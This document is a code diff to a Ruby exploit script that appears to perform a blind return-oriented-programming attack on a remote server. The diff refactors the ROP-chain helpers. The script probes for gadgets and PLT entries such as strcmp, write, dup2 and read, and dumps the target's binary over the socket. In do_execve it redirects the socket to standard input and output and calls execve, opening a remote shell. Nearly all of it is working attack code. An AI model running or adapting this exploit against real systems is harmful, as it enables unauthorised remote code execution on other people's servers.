@@ -461,6 +461,41 @@ def try_exp_print(addr, rop)
         return r
 end
 
+# dmccrady: Encapsulate all ROP call voodoo into one spot.
+
+def set_arg1(rop, arg1)
+	rop << $rdi
+	rop << arg1
+end
+
+def set_arg2(rop, arg2)
+	rop << $rdi - 2
+	rop << arg2
+	rop << 0
+end
+
+
+def plt_call_1(rop, fnIdx, arg1)
+	set_arg1(rop, arg1)
+	plt_fn(rop, fnIdx)
+end
+
+def plt_call_2(rop, fnIdx, arg1, arg2)
+	set_arg1(rop, arg1)
+	set_arg2(rop, arg2)
+	plt_fn(rop, fnIdx)
+end
+
+# dmccrady: Note that arg3 isn't actually the value
+# of the third argument, it's an argument to 'strcmp'
+def plt_call_3(rop, fnIdx, arg1, arg2, arg3 = 0x400000)
+	set_rdx(rop, arg3)
+	set_arg1(rop, arg1)
+	set_arg2(rop, arg2)
+	plt_fn(rop, fnIdx)
+end
+
+
 # dmccrady: Encapsulate plt call voodoo in one spot.
 #
 # This uniformly replaces all occurances of the following ROP instructions:
@@ -779,8 +814,6 @@ def dump_fd_addr(fd, addr, write = $write, listnum = 2)
 
 	rop = []
 
-	set_rdx(rop) if $strcmp
-
 	for i in 0..20
 		f = fd
 		a = addr + (i * 4)
@@ -790,16 +823,7 @@ def dump_fd_addr(fd, addr, write = $write, listnum = 2)
 			a = addr
 		end
 
-		rop << $rdi
-		rop << f
-
-		rop << $rdi - 2
-		rop << a
-		rop << 0
-
-		plt_fn(rop, write)
-		#rop << ($plt + 0xb)
-		#rop << write
+		plt_call_3(rop, write, f, a)		
 	end
 
 	rop << $death
@@ -844,28 +868,10 @@ def dump_addr(addr)
 
 	rop = []
 
-	#rop << $rdi - 2
-	#rop << fd
-	#rop << 0
-
-	#plt_fn(rop, $dup2)
-	#rop << ($plt + 0xb)
-	#rop << $dup2
-	call_dup2(rop, $file_desc, fd)
+	plt_call_2(rop, $dup2, $file_desc, fd)
 
 	for i in 0..20
-		set_rdx(rop)
-
-		rop << $rdi
-		rop << fd
-
-		rop << $rdi - 2
-		rop << addr + (i * 7)
-		rop << 0
-
-		plt_fn(rop, $write)
-		#rop << ($plt + 0xb)
-		#rop << $write
+		plt_call_3(rop, $write, fd, addr + (i * 7))
 	end
 
 	rop << $death
@@ -893,7 +899,7 @@ def dump_bin()
 	fd = 3
 	err = 0
 
-        f = File.open("text.bin", "wb")
+    f = File.open("text.bin", "wb")
 
 	last = Time.now
 
@@ -1059,16 +1065,7 @@ def set_rdx(rop, good = 0x400000)
 #	good = 0x400000
 #	good = $vsyscall + 100
 
-	rop << $rdi
-	rop << good
-
-	rop << $rdi - 2
-	rop << good
-	rop << 0
-
-	#rop << ($plt + 0xb)
-	#rop << $strcmp
-	plt_fn(rop, $strcmp)
+	plt_call_2(rop, $strcmp, good, good)
 end
 
 def got_write(x)
@@ -1094,16 +1091,8 @@ def try_write3(write, fd, rep, sl)
 
 	rop = []
 
-	set_rdx(rop)
+	plt_call_3(rop, write, fd, addr)
 
-	rop << $rdi - 2
-	rop << addr
-	rop << 0
-
-	rop << $rdi
-	rop << fd
-
-	plt_fn(rop, write)
 	rop << $death
 
 	# dmccrady:  try the exploit
@@ -1257,6 +1246,7 @@ def print_progress()
 end
 
 def exp()
+	abort("Function exp() shouldn't be called")
 	print("Exploiting\n")
 
 	listeners = []
@@ -1395,7 +1385,7 @@ def get_dist(gadget, inc)
 	dist = 0
 
 	for i in 1..7
-                rop = Array.new($depth) { |j| $plt }
+        rop = Array.new($depth) { |j| $plt }
 
 		rop[0] = gadget + inc * i
 
@@ -1444,7 +1434,7 @@ def find_gadget()
 
 		rop[0] = i
 
-                r = try_exp_print(i, rop)
+        r = try_exp_print(i, rop)
 		if r == true
 			if verify_gadget(i)
 				print("Found POP at 0x#{i.to_s(16)}\n")
@@ -1513,19 +1503,10 @@ def find_plt_depth()
 	$ret   = 0x430000
 end
 
-def call_plt(entry, arg1, arg2)
+def try_strcmp(entry, arg1, arg2)
 	rop = []
 
-	rop << $rdi
-	rop << arg1
-
-	rop << $rdi - 2
-	rop << arg2
-	rop << 0
-
-	#rop << ($plt + 0xb)
-	#rop << entry
-	plt_fn(rop, entry)
+	plt_call_2(rop, entry, arg1, arg2)
 
 	($depth - rop.length).times do
 		rop << $plt_stop_gadget
@@ -1534,17 +1515,17 @@ def call_plt(entry, arg1, arg2)
 	return try_exp(rop)
 end
 
-def try_strcmp(entry)
+def test_strcmp(entry)
 	print("Trying PLT entry #{entry.to_s(16)}\r")
 
 	good = 0x400000
 
-	return false if call_plt(entry, 3, 5) != false
-	return false if call_plt(entry, good, 5) != false
-	return false if call_plt(entry, 3, good) != false
+	return false if try_strcmp(entry, 3, 5) != false
+	return false if try_strcmp(entry, good, 5) != false
+	return false if try_strcmp(entry, 3, good) != false
 
-	return false if call_plt(entry, good, good) != true
-	return false if call_plt(entry, $vsyscall + 0x1000 - 1, good) != true
+	return false if try_strcmp(entry, good, good) != true
+	return false if try_strcmp(entry, $vsyscall + 0x1000 - 1, good) != true
 
 	return true
 end
@@ -1553,7 +1534,7 @@ def find_rdx()
 	print("Finding strcmp using POP RDI at #{$rdi.to_s(16)} and POP RSI at #{($rdi-2).to_s(16)}\n")
 
 	for i in 0..256
-		if try_strcmp(i)
+		if test_strcmp(i)
 			print("\nFound strcmp at PLT 0x#{i.to_s(16)}\n")
 			$strcmp = i
 			return
@@ -1577,29 +1558,9 @@ def find_dup2()
 
 		rop = []
 
-		rop << $rdi
-		rop << $file_desc
+		plt_call_2(rop, i, $file_desc, target_fd)     # dup2($file_desc, target_fd)
+		plt_call_3(rop, $write, target_fd, 0x400000)  # write(target_fd, 0x400000, [len])
 
-		rop << $rdi - 2
-		rop << target_fd
-		rop << 0
-
-		#rop << ($plt + 0xb)
-		#rop << i
-		plt_fn(rop, i)
-
-		set_rdx(rop)
-
-		rop << $rdi
-		rop << target_fd
-
-		rop << $rdi - 2
-		rop << 0x400000
-		rop << 0
-
-		#rop << ($plt + 0xb)
-		#rop << $write
-		plt_fn(rop, $write)
 		rop << $death
 
 		s = get_child()
@@ -1621,87 +1582,31 @@ end
 
 
 def do_read(rop, fd, writable, read = $read)
-	rop << $rdi
-	rop << fd
-
-	rop << $rdi - 2
-	rop << writable
-	rop << 0
-
 	10.times do
-		#rop << ($plt + 0xb)
-		#rop << $write
-		plt_fn(rop, $write)	end
-
-	10.times do
-		#rop << ($plt + 0xb)
-		#rop << read
-		plt_fn(rop, read)
+		plt_call_3(rop, $write, fd, writable)
 	end
 
-	#rop << ($plt + 0xb)
-	#rop << $write
-	plt_fn(rop, $write)
+	10.times do
+		plt_call_3(rop, read, fd, writable)
+	end
+
+	plt_call_3(rop, $write, fd, writable)
 end
 
-def call_usleep(rop, sl)
-	abort("usleep not found yet") if not $usleep
-
-	rop << $rdi
-	rop << 1000 * 1000 * 2
-
-	#rop << ($plt + 0xb)
-	#rop << $usleep
-	plt_fn(rop, $usleep)
-end
 
 def do_read2(rop, fd, writable)
 
-    # 1. Call write
-	set_rdx(rop, $goodrdx)
-
-	rop << $rdi
-	rop << fd
-
-	rop << $rdi - 2
-	rop << writable
-	rop << 0
-
-	#rop << ($plt + 0xb)
-	#rop << $write
-	plt_fn(rop, $write)
+	# 1. Call write
+	plt_call_3(rop, $write, fd, writable, $goodrdx)
 
 	# 2. Call usleep for 2 seconds
-	call_usleep(rop, 1000 * 1000 * 2)
+	plt_call_1(rop, $usleep, 1000 * 1000 * 2)
 
 	# 3. Call read
-	set_rdx(rop, $goodrdx)
-
-	rop << $rdi
-	rop << fd
-
-	rop << $rdi - 2
-	rop << writable
-	rop << 0
-
-	#rop << ($plt + 0xb)
-	#rop << $read
-	plt_fn(rop, $read)
+	plt_call_3(rop, $read, fd, writable, $goodrdx)
 
 	# 4. Call write
-
-	set_rdx(rop, $goodrdx)
-
-	rop << $rdi
-	rop << fd
-
-	rop << $rdi - 2
-	rop << writable
-	rop << 0
-
-	#rop << ($plt + 0xb)
-	#rop << $write
-	plt_fn(rop, $write)
+	plt_call_3(rop, $write, fd, writable, $goodrdx)
 
 end
 
@@ -1719,16 +1624,8 @@ def find_read()
 
 		rop = []
 
-		#rop << $rdi - 2
-		#rop << fd
-		#rop << 0
+		plt_call_2(rop, $dup2, $file_desc, fd)
 
-		#rop << ($plt + 0xb)
-		#rop << $dup2
-		#plt_fn(rop, $dup2)
-		call_dup2(rop, $file_desc, fd)
-
-		set_rdx(rop)
 		do_read(rop, fd, writable, i)
 
 		rop << $death
@@ -1763,33 +1660,6 @@ def find_read()
 	end
 end
 
-def call_dup2(rop, oldfd, newfd)
-	rop << $rdi - 2
-	rop << newfd
-	rop << 0
-
-	rop << $rdi
-	rop << oldfd
-
-	plt_fn(rop, $dup2)
-end
-
-def dup_fd(rop, fd, src = false)
-	abort("Don't call this dup_fd function")
-	rop << $rdi - 2
-	rop << fd
-	rop << 0
-
-	if src != false
-		rop << $rdi
-		rop << src
-	end
-
-	#rop << ($plt + 0xb)
-	#rop << $dup2
-	plt_fn(rop, $dup2)
-end
-
 def find_good_rdx()
 	print("Finding good rdx\n")
 
@@ -1800,20 +1670,9 @@ def find_good_rdx()
 	while true
 		rop = []
 
-		#dup_fd(rop, fd)
-		call_dup2(rop, $file_desc, fd)
-		set_rdx(rop, addr)
+		plt_call_2(rop, $dup2, $file_desc, fd)
+		plt_call_3(rop, $write, fd, addr, addr)
 
-		rop << $rdi
-		rop << fd
-
-		rop << $rdi - 2
-		rop << addr
-		rop << 0
-
-		#rop << ($plt + 0xb)
-		#rop << $write
-		plt_fn(rop, $write)
 		rop << $death
 
 		s = get_child()
@@ -1849,27 +1708,16 @@ def do_execve()
 	#dup_fd(rop, 0, fd)
 	#dup_fd(rop, 1, fd)
 	#dup_fd(rop, 2, fd)
-	call_dup2(rop, $file_desc, fd)
-	call_dup2(rop, fd, 0)
-	call_dup2(rop, fd, 1)
-	call_dup2(rop, fd, 2)
+	plt_call_2(rop, $dup2, $file_desc, fd)
+	plt_call_2(rop, $dup2, fd, 0)
+	plt_call_2(rop, $dup2, fd, 1)
+	plt_call_2(rop, $dup2, fd, 2)
 
 	do_read2(rop, fd, writable)
 
 	# Call execve
+	plt_call_3(rop, $execve, writable, 0, 0x400000 + 8)
 
-	set_rdx(rop, 0x400000 + 8)
-
-	rop << $rdi
-	rop << writable
-
-	rop << $rdi - 2
-	rop << 0
-	rop << 0
-
-	#rop << ($plt + 0xb)
-	#rop << i
-	plt_fn(rop, $execve)
 	rop << $death
 
 	s = get_child()
